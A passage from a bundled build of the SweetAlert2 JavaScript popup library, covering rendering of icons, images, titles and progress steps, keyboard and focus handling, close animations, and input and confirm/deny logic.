        if (params.iconHtml) newContent = iconContent(params.iconHtml);
        else if (params.icon === "success") {
            newContent = successIconHtml;
            oldContent = oldContent.replace(/ style=".*?"/g, ""); // undo adjustSuccessIconBackgroundColor()
        } else if (params.icon === "error") newContent = errorIconHtml;
        else if (params.icon) {
            const defaultIconHtml = {
                question: "?",
                warning: "!",
                info: "i"
            };
            newContent = iconContent(defaultIconHtml[params.icon]);
        }
        if (oldContent.trim() !== newContent.trim()) setInnerHtml(icon, newContent);
    };
    /**
   * @param {HTMLElement} icon
   * @param {SweetAlertOptions} params
   */ const setColor = (icon, params)=>{
        if (!params.iconColor) return;
        icon.style.color = params.iconColor;
        icon.style.borderColor = params.iconColor;
        for (const sel of [
            ".swal2-success-line-tip",
            ".swal2-success-line-long",
            ".swal2-x-mark-line-left",
            ".swal2-x-mark-line-right"
        ])setStyle(icon, sel, "background-color", params.iconColor);
        setStyle(icon, ".swal2-success-ring", "border-color", params.iconColor);
    };
    /**
   * @param {string} content
   * @returns {string}
   */ const iconContent = (content)=>`<div class="${swalClasses["icon-content"]}">${content}</div>`;
    /**
   * @param {SweetAlert} instance
   * @param {SweetAlertOptions} params
   */ const renderImage = (instance, params)=>{
        const image = getImage();
        if (!image) return;
        if (!params.imageUrl) {
            hide(image);
            return;
        }
        show(image, "");
        // Src, alt
        image.setAttribute("src", params.imageUrl);
        image.setAttribute("alt", params.imageAlt || "");
        // Width, height
        applyNumericalStyle(image, "width", params.imageWidth);
        applyNumericalStyle(image, "height", params.imageHeight);
        // Class
        image.className = swalClasses.image;
        applyCustomClass(image, params, "image");
    };
    /**
   * @param {SweetAlert} instance
   * @param {SweetAlertOptions} params
   */ const renderPopup = (instance, params)=>{
        const container = getContainer();
        const popup = getPopup();
        if (!container || !popup) return;
        // Width
        // https://github.com/sweetalert2/sweetalert2/issues/2170
        if (params.toast) {
            applyNumericalStyle(container, "width", params.width);
            popup.style.width = "100%";
            const loader = getLoader();
            if (loader) popup.insertBefore(loader, getIcon());
        } else applyNumericalStyle(popup, "width", params.width);
        // Padding
        applyNumericalStyle(popup, "padding", params.padding);
        // Color
        if (params.color) popup.style.color = params.color;
        // Background
        if (params.background) popup.style.background = params.background;
        hide(getValidationMessage());
        // Classes
        addClasses$1(popup, params);
    };
    /**
   * @param {HTMLElement} popup
   * @param {SweetAlertOptions} params
   */ const addClasses$1 = (popup, params)=>{
        const showClass = params.showClass || {};
        // Default Class + showClass when updating Swal.update({})
        popup.className = `${swalClasses.popup} ${isVisible$1(popup) ? showClass.popup : ""}`;
        if (params.toast) {
            addClass([
                document.documentElement,
                document.body
            ], swalClasses["toast-shown"]);
            addClass(popup, swalClasses.toast);
        } else addClass(popup, swalClasses.modal);
        // Custom class
        applyCustomClass(popup, params, "popup");
        // TODO: remove in the next major
        if (typeof params.customClass === "string") addClass(popup, params.customClass);
        // Icon class (#1842)
        if (params.icon) addClass(popup, swalClasses[`icon-${params.icon}`]);
    };
    /**
   * @param {SweetAlert} instance
   * @param {SweetAlertOptions} params
   */ const renderProgressSteps = (instance, params)=>{
        const progressStepsContainer = getProgressSteps();
        if (!progressStepsContainer) return;
        const { progressSteps, currentProgressStep } = params;
        if (!progressSteps || progressSteps.length === 0 || currentProgressStep === undefined) {
            hide(progressStepsContainer);
            return;
        }
        show(progressStepsContainer);
        progressStepsContainer.textContent = "";
        if (currentProgressStep >= progressSteps.length) warn("Invalid currentProgressStep parameter, it should be less than progressSteps.length (currentProgressStep like JS arrays starts from 0)");
        progressSteps.forEach((step, index)=>{
            const stepEl = createStepElement(step);
            progressStepsContainer.appendChild(stepEl);
            if (index === currentProgressStep) addClass(stepEl, swalClasses["active-progress-step"]);
            if (index !== progressSteps.length - 1) {
                const lineEl = createLineElement(params);
                progressStepsContainer.appendChild(lineEl);
            }
        });
    };
    /**
   * @param {string} step
   * @returns {HTMLLIElement}
   */ const createStepElement = (step)=>{
        const stepEl = document.createElement("li");
        addClass(stepEl, swalClasses["progress-step"]);
        setInnerHtml(stepEl, step);
        return stepEl;
    };
    /**
   * @param {SweetAlertOptions} params
   * @returns {HTMLLIElement}
   */ const createLineElement = (params)=>{
        const lineEl = document.createElement("li");
        addClass(lineEl, swalClasses["progress-step-line"]);
        if (params.progressStepsDistance) applyNumericalStyle(lineEl, "width", params.progressStepsDistance);
        return lineEl;
    };
    /**
   * @param {SweetAlert} instance
   * @param {SweetAlertOptions} params
   */ const renderTitle = (instance, params)=>{
        const title = getTitle();
        if (!title) return;
        showWhenInnerHtmlPresent(title);
        toggle(title, params.title || params.titleText, "block");
        if (params.title) parseHtmlToContainer(params.title, title);
        if (params.titleText) title.innerText = params.titleText;
        // Custom class
        applyCustomClass(title, params, "title");
    };
    /**
   * @param {SweetAlert} instance
   * @param {SweetAlertOptions} params
   */ const render = (instance, params)=>{
        renderPopup(instance, params);
        renderContainer(instance, params);
        renderProgressSteps(instance, params);
        renderIcon(instance, params);
        renderImage(instance, params);
        renderTitle(instance, params);
        renderCloseButton(instance, params);
        renderContent(instance, params);
        renderActions(instance, params);
        renderFooter(instance, params);
        const popup = getPopup();
        if (typeof params.didRender === "function" && popup) params.didRender(popup);
        globalState.eventEmitter.emit("didRender", popup);
    };
    /*
   * Global function to determine if SweetAlert2 popup is shown
   */ const isVisible = ()=>{
        return isVisible$1(getPopup());
    };
    /*
   * Global function to click 'Confirm' button
   */ const clickConfirm = ()=>{
        var _dom$getConfirmButton;
        return (_dom$getConfirmButton = getConfirmButton()) === null || _dom$getConfirmButton === void 0 ? void 0 : _dom$getConfirmButton.click();
    };
    /*
   * Global function to click 'Deny' button
   */ const clickDeny = ()=>{
        var _dom$getDenyButton;
        return (_dom$getDenyButton = getDenyButton()) === null || _dom$getDenyButton === void 0 ? void 0 : _dom$getDenyButton.click();
    };
    /*
   * Global function to click 'Cancel' button
   */ const clickCancel = ()=>{
        var _dom$getCancelButton;
        return (_dom$getCancelButton = getCancelButton()) === null || _dom$getCancelButton === void 0 ? void 0 : _dom$getCancelButton.click();
    };
    /** @typedef {'cancel' | 'backdrop' | 'close' | 'esc' | 'timer'} DismissReason */ /** @type {Record<DismissReason, DismissReason>} */ const DismissReason = Object.freeze({
        cancel: "cancel",
        backdrop: "backdrop",
        close: "close",
        esc: "esc",
        timer: "timer"
    });
    /**
   * @param {GlobalState} globalState
   */ const removeKeydownHandler = (globalState)=>{
        if (globalState.keydownTarget && globalState.keydownHandlerAdded) {
            globalState.keydownTarget.removeEventListener("keydown", globalState.keydownHandler, {
                capture: globalState.keydownListenerCapture
            });
            globalState.keydownHandlerAdded = false;
        }
    };
    /**
   * @param {GlobalState} globalState
   * @param {SweetAlertOptions} innerParams
   * @param {*} dismissWith
   */ const addKeydownHandler = (globalState, innerParams, dismissWith)=>{
        removeKeydownHandler(globalState);
        if (!innerParams.toast) {
            globalState.keydownHandler = (e)=>keydownHandler(innerParams, e, dismissWith);
            globalState.keydownTarget = innerParams.keydownListenerCapture ? window : getPopup();
            globalState.keydownListenerCapture = innerParams.keydownListenerCapture;
            globalState.keydownTarget.addEventListener("keydown", globalState.keydownHandler, {
                capture: globalState.keydownListenerCapture
            });
            globalState.keydownHandlerAdded = true;
        }
    };
    /**
   * @param {number} index
   * @param {number} increment
   */ const setFocus = (index, increment)=>{
        var _dom$getPopup;
        const focusableElements = getFocusableElements();
        // search for visible elements and select the next possible match
        if (focusableElements.length) {
            index = index + increment;
            // rollover to first item
            if (index === focusableElements.length) index = 0;
            else if (index === -1) index = focusableElements.length - 1;
            focusableElements[index].focus();
            return;
        }
        // no visible focusable elements, focus the popup
        (_dom$getPopup = getPopup()) === null || _dom$getPopup === void 0 || _dom$getPopup.focus();
    };
    const arrowKeysNextButton = [
        "ArrowRight",
        "ArrowDown"
    ];
    const arrowKeysPreviousButton = [
        "ArrowLeft",
        "ArrowUp"
    ];
    /**
   * @param {SweetAlertOptions} innerParams
   * @param {KeyboardEvent} event
   * @param {Function} dismissWith
   */ const keydownHandler = (innerParams, event, dismissWith)=>{
        if (!innerParams) return; // This instance has already been destroyed
        // Ignore keydown during IME composition
        // https://developer.mozilla.org/en-US/docs/Web/API/Document/keydown_event#ignoring_keydown_during_ime_composition
        // https://github.com/sweetalert2/sweetalert2/issues/720
        // https://github.com/sweetalert2/sweetalert2/issues/2406
        if (event.isComposing || event.keyCode === 229) return;
        if (innerParams.stopKeydownPropagation) event.stopPropagation();
        // ENTER
        if (event.key === "Enter") handleEnter(event, innerParams);
        else if (event.key === "Tab") handleTab(event);
        else if ([
            ...arrowKeysNextButton,
            ...arrowKeysPreviousButton
        ].includes(event.key)) handleArrows(event.key);
        else if (event.key === "Escape") handleEsc(event, innerParams, dismissWith);
    };
    /**
   * @param {KeyboardEvent} event
   * @param {SweetAlertOptions} innerParams
   */ const handleEnter = (event, innerParams)=>{
        // https://github.com/sweetalert2/sweetalert2/issues/2386
        if (!callIfFunction(innerParams.allowEnterKey)) return;
        const input = getInput$1(getPopup(), innerParams.input);
        if (event.target && input && event.target instanceof HTMLElement && event.target.outerHTML === input.outerHTML) {
            if ([
                "textarea",
                "file"
            ].includes(innerParams.input)) return; // do not submit
            clickConfirm();
            event.preventDefault();
        }
    };
    /**
   * @param {KeyboardEvent} event
   */ const handleTab = (event)=>{
        const targetElement = event.target;
        const focusableElements = getFocusableElements();
        let btnIndex = -1;
        for(let i = 0; i < focusableElements.length; i++)if (targetElement === focusableElements[i]) {
            btnIndex = i;
            break;
        }
        // Cycle to the next button
        if (!event.shiftKey) setFocus(btnIndex, 1);
        else setFocus(btnIndex, -1);
        event.stopPropagation();
        event.preventDefault();
    };
    /**
   * @param {string} key
   */ const handleArrows = (key)=>{
        const actions = getActions();
        const confirmButton = getConfirmButton();
        const denyButton = getDenyButton();
        const cancelButton = getCancelButton();
        if (!actions || !confirmButton || !denyButton || !cancelButton) return;
        /** @type HTMLElement[] */ const buttons = [
            confirmButton,
            denyButton,
            cancelButton
        ];
        if (document.activeElement instanceof HTMLElement && !buttons.includes(document.activeElement)) return;
        const sibling = arrowKeysNextButton.includes(key) ? "nextElementSibling" : "previousElementSibling";
        let buttonToFocus = document.activeElement;
        if (!buttonToFocus) return;
        for(let i = 0; i < actions.children.length; i++){
            buttonToFocus = buttonToFocus[sibling];
            if (!buttonToFocus) return;
            if (buttonToFocus instanceof HTMLButtonElement && isVisible$1(buttonToFocus)) break;
        }
        if (buttonToFocus instanceof HTMLButtonElement) buttonToFocus.focus();
    };
    /**
   * @param {KeyboardEvent} event
   * @param {SweetAlertOptions} innerParams
   * @param {Function} dismissWith
   */ const handleEsc = (event, innerParams, dismissWith)=>{
        if (callIfFunction(innerParams.allowEscapeKey)) {
            event.preventDefault();
            dismissWith(DismissReason.esc);
        }
    };
    /**
   * This module contains `WeakMap`s for each effectively-"private  property" that a `Swal` has.
   * For example, to set the private property "foo" of `this` to "bar", you can `privateProps.foo.set(this, 'bar')`
   * This is the approach that Babel will probably take to implement private methods/fields
   *   https://github.com/tc39/proposal-private-methods
   *   https://github.com/babel/babel/pull/7555
   * Once we have the changes from that PR in Babel, and our core class fits reasonable in *one module*
   *   then we can use that language feature.
   */ var privateMethods = {
        swalPromiseResolve: new WeakMap(),
        swalPromiseReject: new WeakMap()
    };
    // From https://developer.paciellogroup.com/blog/2018/06/the-current-state-of-modal-dialog-accessibility/
    // Adding aria-hidden="true" to elements outside of the active modal dialog ensures that
    // elements not within the active modal dialog will not be surfaced if a user opens a screen
    // reader’s list of elements (headings, form controls, landmarks, etc.) in the document.
    const setAriaHidden = ()=>{
        const container = getContainer();
        const bodyChildren = Array.from(document.body.children);
        bodyChildren.forEach((el)=>{
            if (el.contains(container)) return;
            if (el.hasAttribute("aria-hidden")) el.setAttribute("data-previous-aria-hidden", el.getAttribute("aria-hidden") || "");
            el.setAttribute("aria-hidden", "true");
        });
    };
    const unsetAriaHidden = ()=>{
        const bodyChildren = Array.from(document.body.children);
        bodyChildren.forEach((el)=>{
            if (el.hasAttribute("data-previous-aria-hidden")) {
                el.setAttribute("aria-hidden", el.getAttribute("data-previous-aria-hidden") || "");
                el.removeAttribute("data-previous-aria-hidden");
            } else el.removeAttribute("aria-hidden");
        });
    };
    // @ts-ignore
    const isSafariOrIOS = typeof window !== "undefined" && !!window.GestureEvent; // true for Safari desktop + all iOS browsers https://stackoverflow.com/a/70585394
    /**
   * Fix iOS scrolling
   * http://stackoverflow.com/q/39626302
   */ const iOSfix = ()=>{
        if (isSafariOrIOS && !hasClass(document.body, swalClasses.iosfix)) {
            const offset = document.body.scrollTop;
            document.body.style.top = `${offset * -1}px`;
            addClass(document.body, swalClasses.iosfix);
            lockBodyScroll();
        }
    };
    /**
   * https://github.com/sweetalert2/sweetalert2/issues/1246
   */ const lockBodyScroll = ()=>{
        const container = getContainer();
        if (!container) return;
        /** @type {boolean} */ let preventTouchMove;
        /**
     * @param {TouchEvent} event
     */ container.ontouchstart = (event)=>{
            preventTouchMove = shouldPreventTouchMove(event);
        };
        /**
     * @param {TouchEvent} event
     */ container.ontouchmove = (event)=>{
            if (preventTouchMove) {
                event.preventDefault();
                event.stopPropagation();
            }
        };
    };
    /**
   * @param {TouchEvent} event
   * @returns {boolean}
   */ const shouldPreventTouchMove = (event)=>{
        const target = event.target;
        const container = getContainer();
        const htmlContainer = getHtmlContainer();
        if (!container || !htmlContainer) return false;
        if (isStylus(event) || isZoom(event)) return false;
        if (target === container) return true;
        if (!isScrollable(container) && target instanceof HTMLElement && target.tagName !== "INPUT" && // #1603
        target.tagName !== "TEXTAREA" && // #2266
        !(isScrollable(htmlContainer) && // #1944
        htmlContainer.contains(target))) return true;
        return false;
    };
    /**
   * https://github.com/sweetalert2/sweetalert2/issues/1786
   *
   * @param {*} event
   * @returns {boolean}
   */ const isStylus = (event)=>{
        return event.touches && event.touches.length && event.touches[0].touchType === "stylus";
    };
    /**
   * https://github.com/sweetalert2/sweetalert2/issues/1891
   *
   * @param {TouchEvent} event
   * @returns {boolean}
   */ const isZoom = (event)=>{
        return event.touches && event.touches.length > 1;
    };
    const undoIOSfix = ()=>{
        if (hasClass(document.body, swalClasses.iosfix)) {
            const offset = parseInt(document.body.style.top, 10);
            removeClass(document.body, swalClasses.iosfix);
            document.body.style.top = "";
            document.body.scrollTop = offset * -1;
        }
    };
    /**
   * Measure scrollbar width for padding body during modal show/hide
   * https://github.com/twbs/bootstrap/blob/master/js/src/modal.js
   *
   * @returns {number}
   */ const measureScrollbar = ()=>{
        const scrollDiv = document.createElement("div");
        scrollDiv.className = swalClasses["scrollbar-measure"];
        document.body.appendChild(scrollDiv);
        const scrollbarWidth = scrollDiv.getBoundingClientRect().width - scrollDiv.clientWidth;
        document.body.removeChild(scrollDiv);
        return scrollbarWidth;
    };
    /**
   * Remember state in cases where opening and handling a modal will fiddle with it.
   * @type {number | null}
   */ let previousBodyPadding = null;
    /**
   * @param {string} initialBodyOverflow
   */ const replaceScrollbarWithPadding = (initialBodyOverflow)=>{
        // for queues, do not do this more than once
        if (previousBodyPadding !== null) return;
        // if the body has overflow
        if (document.body.scrollHeight > window.innerHeight || initialBodyOverflow === "scroll" // https://github.com/sweetalert2/sweetalert2/issues/2663
        ) {
            // add padding so the content doesn't shift after removal of scrollbar
            previousBodyPadding = parseInt(window.getComputedStyle(document.body).getPropertyValue("padding-right"));
            document.body.style.paddingRight = `${previousBodyPadding + measureScrollbar()}px`;
        }
    };
    const undoReplaceScrollbarWithPadding = ()=>{
        if (previousBodyPadding !== null) {
            document.body.style.paddingRight = `${previousBodyPadding}px`;
            previousBodyPadding = null;
        }
    };
    /**
   * @param {SweetAlert} instance
   * @param {HTMLElement} container
   * @param {boolean} returnFocus
   * @param {Function} didClose
   */ function removePopupAndResetState(instance, container, returnFocus, didClose) {
        if (isToast()) triggerDidCloseAndDispose(instance, didClose);
        else {
            restoreActiveElement(returnFocus).then(()=>triggerDidCloseAndDispose(instance, didClose));
            removeKeydownHandler(globalState);
        }
        // workaround for https://github.com/sweetalert2/sweetalert2/issues/2088
        // for some reason removing the container in Safari will scroll the document to bottom
        if (isSafariOrIOS) {
            container.setAttribute("style", "display:none !important");
            container.removeAttribute("class");
            container.innerHTML = "";
        } else container.remove();
        if (isModal()) {
            undoReplaceScrollbarWithPadding();
            undoIOSfix();
            unsetAriaHidden();
        }
        removeBodyClasses();
    }
    /**
   * Remove SweetAlert2 classes from body
   */ function removeBodyClasses() {
        removeClass([
            document.documentElement,
            document.body
        ], [
            swalClasses.shown,
            swalClasses["height-auto"],
            swalClasses["no-backdrop"],
            swalClasses["toast-shown"]
        ]);
    }
    /**
   * Instance method to close sweetAlert
   *
   * @param {any} resolveValue
   */ function close(resolveValue) {
        resolveValue = prepareResolveValue(resolveValue);
        const swalPromiseResolve = privateMethods.swalPromiseResolve.get(this);
        const didClose = triggerClosePopup(this);
        if (this.isAwaitingPromise) // A swal awaiting for a promise (after a click on Confirm or Deny) cannot be dismissed anymore #2335
        {
            if (!resolveValue.isDismissed) {
                handleAwaitingPromise(this);
                swalPromiseResolve(resolveValue);
            }
        } else if (didClose) // Resolve Swal promise
        swalPromiseResolve(resolveValue);
    }
    const triggerClosePopup = (instance)=>{
        const popup = getPopup();
        if (!popup) return false;
        const innerParams = privateProps.innerParams.get(instance);
        if (!innerParams || hasClass(popup, innerParams.hideClass.popup)) return false;
        removeClass(popup, innerParams.showClass.popup);
        addClass(popup, innerParams.hideClass.popup);
        const backdrop = getContainer();
        removeClass(backdrop, innerParams.showClass.backdrop);
        addClass(backdrop, innerParams.hideClass.backdrop);
        handlePopupAnimation(instance, popup, innerParams);
        return true;
    };
    /**
   * @param {any} error
   */ function rejectPromise(error) {
        const rejectPromise = privateMethods.swalPromiseReject.get(this);
        handleAwaitingPromise(this);
        if (rejectPromise) // Reject Swal promise
        rejectPromise(error);
    }
    /**
   * @param {SweetAlert} instance
   */ const handleAwaitingPromise = (instance)=>{
        if (instance.isAwaitingPromise) {
            delete instance.isAwaitingPromise;
            // The instance might have been previously partly destroyed, we must resume the destroy process in this case #2335
            if (!privateProps.innerParams.get(instance)) instance._destroy();
        }
    };
    /**
   * @param {any} resolveValue
   * @returns {SweetAlertResult}
   */ const prepareResolveValue = (resolveValue)=>{
        // When user calls Swal.close()
        if (typeof resolveValue === "undefined") return {
            isConfirmed: false,
            isDenied: false,
            isDismissed: true
        };
        return Object.assign({
            isConfirmed: false,
            isDenied: false,
            isDismissed: false
        }, resolveValue);
    };
    /**
   * @param {SweetAlert} instance
   * @param {HTMLElement} popup
   * @param {SweetAlertOptions} innerParams
   */ const handlePopupAnimation = (instance, popup, innerParams)=>{
        const container = getContainer();
        // If animation is supported, animate
        const animationIsSupported = hasCssAnimation(popup);
        if (typeof innerParams.willClose === "function") innerParams.willClose(popup);
        globalState.eventEmitter.emit("willClose", popup);
        if (animationIsSupported) animatePopup(instance, popup, container, innerParams.returnFocus, innerParams.didClose);
        else // Otherwise, remove immediately
        removePopupAndResetState(instance, container, innerParams.returnFocus, innerParams.didClose);
    };
    /**
   * @param {SweetAlert} instance
   * @param {HTMLElement} popup
   * @param {HTMLElement} container
   * @param {boolean} returnFocus
   * @param {Function} didClose
   */ const animatePopup = (instance, popup, container, returnFocus, didClose)=>{
        globalState.swalCloseEventFinishedCallback = removePopupAndResetState.bind(null, instance, container, returnFocus, didClose);
        const swalCloseAnimationFinished = function(e) {
            if (e.target === popup) {
                globalState.swalCloseEventFinishedCallback();
                delete globalState.swalCloseEventFinishedCallback;
                popup.removeEventListener("animationend", swalCloseAnimationFinished);
                popup.removeEventListener("transitionend", swalCloseAnimationFinished);
            }
        };
        popup.addEventListener("animationend", swalCloseAnimationFinished);
        popup.addEventListener("transitionend", swalCloseAnimationFinished);
    };
    /**
   * @param {SweetAlert} instance
   * @param {Function} didClose
   */ const triggerDidCloseAndDispose = (instance, didClose)=>{
        setTimeout(()=>{
            if (typeof didClose === "function") didClose.bind(instance.params)();
            globalState.eventEmitter.emit("didClose");
            // instance might have been destroyed already
            if (instance._destroy) instance._destroy();
        });
    };
    /**
   * Shows loader (spinner), this is useful with AJAX requests.
   * By default the loader be shown instead of the "Confirm" button.
   *
   * @param {HTMLButtonElement | null} [buttonToReplace]
   */ const showLoading = (buttonToReplace)=>{
        let popup = getPopup();
        if (!popup) new Swal();
        popup = getPopup();
        if (!popup) return;
        const loader = getLoader();
        if (isToast()) hide(getIcon());
        else replaceButton(popup, buttonToReplace);
        show(loader);
        popup.setAttribute("data-loading", "true");
        popup.setAttribute("aria-busy", "true");
        popup.focus();
    };
    /**
   * @param {HTMLElement} popup
   * @param {HTMLButtonElement | null} [buttonToReplace]
   */ const replaceButton = (popup, buttonToReplace)=>{
        const actions = getActions();
        const loader = getLoader();
        if (!actions || !loader) return;
        if (!buttonToReplace && isVisible$1(getConfirmButton())) buttonToReplace = getConfirmButton();
        show(actions);
        if (buttonToReplace) {
            hide(buttonToReplace);
            loader.setAttribute("data-button-to-replace", buttonToReplace.className);
            actions.insertBefore(loader, buttonToReplace);
        }
        addClass([
            popup,
            actions
        ], swalClasses.loading);
    };
    /**
   * @param {SweetAlert} instance
   * @param {SweetAlertOptions} params
   */ const handleInputOptionsAndValue = (instance, params)=>{
        if (params.input === "select" || params.input === "radio") handleInputOptions(instance, params);
        else if ([
            "text",
            "email",
            "number",
            "tel",
            "textarea"
        ].some((i)=>i === params.input) && (hasToPromiseFn(params.inputValue) || isPromise(params.inputValue))) {
            showLoading(getConfirmButton());
            handleInputValue(instance, params);
        }
    };
    /**
   * @param {SweetAlert} instance
   * @param {SweetAlertOptions} innerParams
   * @returns {SweetAlertInputValue}
   */ const getInputValue = (instance, innerParams)=>{
        const input = instance.getInput();
        if (!input) return null;
        switch(innerParams.input){
            case "checkbox":
                return getCheckboxValue(input);
            case "radio":
                return getRadioValue(input);
            case "file":
                return getFileValue(input);
            default:
                return innerParams.inputAutoTrim ? input.value.trim() : input.value;
        }
    };
    /**
   * @param {HTMLInputElement} input
   * @returns {number}
   */ const getCheckboxValue = (input)=>input.checked ? 1 : 0;
    /**
   * @param {HTMLInputElement} input
   * @returns {string | null}
   */ const getRadioValue = (input)=>input.checked ? input.value : null;
    /**
   * @param {HTMLInputElement} input
   * @returns {FileList | File | null}
   */ const getFileValue = (input)=>input.files && input.files.length ? input.getAttribute("multiple") !== null ? input.files : input.files[0] : null;
    /**
   * @param {SweetAlert} instance
   * @param {SweetAlertOptions} params
   */ const handleInputOptions = (instance, params)=>{
        const popup = getPopup();
        if (!popup) return;
        /**
     * @param {Record<string, any>} inputOptions
     */ const processInputOptions = (inputOptions)=>{
            if (params.input === "select") populateSelectOptions(popup, formatInputOptions(inputOptions), params);
            else if (params.input === "radio") populateRadioOptions(popup, formatInputOptions(inputOptions), params);
        };
        if (hasToPromiseFn(params.inputOptions) || isPromise(params.inputOptions)) {
            showLoading(getConfirmButton());
            asPromise(params.inputOptions).then((inputOptions)=>{
                instance.hideLoading();
                processInputOptions(inputOptions);
            });
        } else if (typeof params.inputOptions === "object") processInputOptions(params.inputOptions);
        else error(`Unexpected type of inputOptions! Expected object, Map or Promise, got ${typeof params.inputOptions}`);
    };
    /**
   * @param {SweetAlert} instance
   * @param {SweetAlertOptions} params
   */ const handleInputValue = (instance, params)=>{
        const input = instance.getInput();
        if (!input) return;
        hide(input);
        asPromise(params.inputValue).then((inputValue)=>{
            input.value = params.input === "number" ? `${parseFloat(inputValue) || 0}` : `${inputValue}`;
            show(input);
            input.focus();
            instance.hideLoading();
        }).catch((err)=>{
            error(`Error in inputValue promise: ${err}`);
            input.value = "";
            show(input);
            input.focus();
            instance.hideLoading();
        });
    };
    /**
   * @param {HTMLElement} popup
   * @param {InputOptionFlattened[]} inputOptions
   * @param {SweetAlertOptions} params
   */ function populateSelectOptions(popup, inputOptions, params) {
        const select = getDirectChildByClass(popup, swalClasses.select);
        if (!select) return;
        /**
     * @param {HTMLElement} parent
     * @param {string} optionLabel
     * @param {string} optionValue
     */ const renderOption = (parent, optionLabel, optionValue)=>{
            const option = document.createElement("option");
            option.value = optionValue;
            setInnerHtml(option, optionLabel);
            option.selected = isSelected(optionValue, params.inputValue);
            parent.appendChild(option);
        };
        inputOptions.forEach((inputOption)=>{
            const optionValue = inputOption[0];
            const optionLabel = inputOption[1];
            // <optgroup> spec:
            // https://www.w3.org/TR/html401/interact/forms.html#h-17.6
            // "...all OPTGROUP elements must be specified directly within a SELECT element (i.e., groups may not be nested)..."
            // check whether this is a <optgroup>
            if (Array.isArray(optionLabel)) {
                // if it is an array, then it is an <optgroup>
                const optgroup = document.createElement("optgroup");
                optgroup.label = optionValue;
                optgroup.disabled = false; // not configurable for now
                select.appendChild(optgroup);
                optionLabel.forEach((o)=>renderOption(optgroup, o[1], o[0]));
            } else // case of <option>
            renderOption(select, optionLabel, optionValue);
        });
        select.focus();
    }
    /**
   * @param {HTMLElement} popup
   * @param {InputOptionFlattened[]} inputOptions
   * @param {SweetAlertOptions} params
   */ function populateRadioOptions(popup, inputOptions, params) {
        const radio = getDirectChildByClass(popup, swalClasses.radio);
        if (!radio) return;
        inputOptions.forEach((inputOption)=>{
            const radioValue = inputOption[0];
            const radioLabel = inputOption[1];
            const radioInput = document.createElement("input");
            const radioLabelElement = document.createElement("label");
            radioInput.type = "radio";
            radioInput.name = swalClasses.radio;
            radioInput.value = radioValue;
            if (isSelected(radioValue, params.inputValue)) radioInput.checked = true;
            const label = document.createElement("span");
            setInnerHtml(label, radioLabel);
            label.className = swalClasses.label;
            radioLabelElement.appendChild(radioInput);
            radioLabelElement.appendChild(label);
            radio.appendChild(radioLabelElement);
        });
        const radios = radio.querySelectorAll("input");
        if (radios.length) radios[0].focus();
    }
    /**
   * Converts `inputOptions` into an array of `[value, label]`s
   *
   * @param {Record<string, any>} inputOptions
   * @typedef {string[]} InputOptionFlattened
   * @returns {InputOptionFlattened[]}
   */ const formatInputOptions = (inputOptions)=>{
        /** @type {InputOptionFlattened[]} */ const result = [];
        if (inputOptions instanceof Map) inputOptions.forEach((value, key)=>{
            let valueFormatted = value;
            if (typeof valueFormatted === "object") // case of <optgroup>
            valueFormatted = formatInputOptions(valueFormatted);
            result.push([
                key,
                valueFormatted
            ]);
        });
        else Object.keys(inputOptions).forEach((key)=>{
            let valueFormatted = inputOptions[key];
            if (typeof valueFormatted === "object") // case of <optgroup>
            valueFormatted = formatInputOptions(valueFormatted);
            result.push([
                key,
                valueFormatted
            ]);
        });
        return result;
    };
    /**
   * @param {string} optionValue
   * @param {SweetAlertInputValue} inputValue
   * @returns {boolean}
   */ const isSelected = (optionValue, inputValue)=>{
        return !!inputValue && inputValue.toString() === optionValue.toString();
    };
    /**
   * @param {SweetAlert} instance
   */ const handleConfirmButtonClick = (instance)=>{
        const innerParams = privateProps.innerParams.get(instance);
        instance.disableButtons();
        if (innerParams.input) handleConfirmOrDenyWithInput(instance, "confirm");
        else confirm(instance, true);
    };
    /**
   * @param {SweetAlert} instance
   */ const handleDenyButtonClick = (instance)=>{
        const innerParams = privateProps.innerParams.get(instance);
        instance.disableButtons();
        if (innerParams.returnInputValueOnDeny) handleConfirmOrDenyWithInput(instance, "deny");
        else deny(instance, false);
    };
    /**
   * @param {SweetAlert} instance
   * @param {Function} dismissWith
   */ const handleCancelButtonClick = (instance, dismissWith)=>{
        instance.disableButtons();
        dismissWith(DismissReason.cancel);
    };
    /**
   * @param {SweetAlert} instance
   * @param {'confirm' | 'deny'} type
   */ const handleConfirmOrDenyWithInput = (instance, type)=>{
        const innerParams = privateProps.innerParams.get(instance);
        if (!innerParams.input) {
            error(`The "input" parameter is needed to be set when using returnInputValueOn${capitalizeFirstLetter(type)}`);
            return;
        }
        const input = instance.getInput();
        const inputValue = getInputValue(instance, innerParams);
        if (innerParams.inputValidator) handleInputValidator(instance, inputValue, type);
        else if (input && !input.checkValidity()) {
            instance.enableButtons();
            instance.showValidationMessage(innerParams.validationMessage || input.validationMessage);
        } else if (type === "deny") deny(instance, inputValue);
        else confirm(instance, inputValue);
    };
    /**
   * @param {SweetAlert} instance
   * @param {SweetAlertInputValue} inputValue
   * @param {'confirm' | 'deny'} type
   */ const handleInputValidator = (instance, inputValue, type)=>{
        const innerParams = privateProps.innerParams.get(instance);
        instance.disableInput();
        const validationPromise = Promise.resolve().then(()=>asPromise(innerParams.inputValidator(inputValue, innerParams.validationMessage)));
        validationPromise.then((validationMessage)=>{
            instance.enableButtons();
            instance.enableInput();
            if (validationMessage) instance.showValidationMessage(validationMessage);
            else if (type === "deny") deny(instance, inputValue);
            else confirm(instance, inputValue);
        });
    };
    /**
   * @param {SweetAlert} instance
   * @param {any} value
   */ const deny = (instance, value)=>{
        const innerParams = privateProps.innerParams.get(instance || undefined);
        if (innerParams.showLoaderOnDeny) showLoading(getDenyButton());
        if (innerParams.preDeny) {
            instance.isAwaitingPromise = true; // Flagging the instance as awaiting a promise so it's own promise's reject/resolve methods doesn't get destroyed until the result from this preDeny's promise is received
            const preDenyPromise = Promise.resolve().then(()=>asPromise(innerParams.preDeny(value, innerParams.validationMessage)));
            preDenyPromise.then((preDenyValue)=>{
                if (preDenyValue === false) {
                    instance.hideLoading();
                    handleAwaitingPromise(instance);
                } else instance.close({
                    isDenied: true,
                    value: typeof preDenyValue === "undefined" ? value : preDenyValue
                });
            }).catch((error)=>rejectWith(instance || undefined, error));
        } else instance.close({
            isDenied: true,
            value
        });
    };
    /**
   * @param {SweetAlert} instance
   * @param {any} value
   */ const succeedWith = (instance, value)=>{
        instance.close({
            isConfirmed: true,
            value
        });
    };
    /**
   *
   * @param {SweetAlert} instance
   * @param {string} error
   */ const rejectWith = (instance, error)=>{
        instance.rejectPromise(error);
    };
    /**
   *
   * @param {SweetAlert} instance
   * @param {any} value
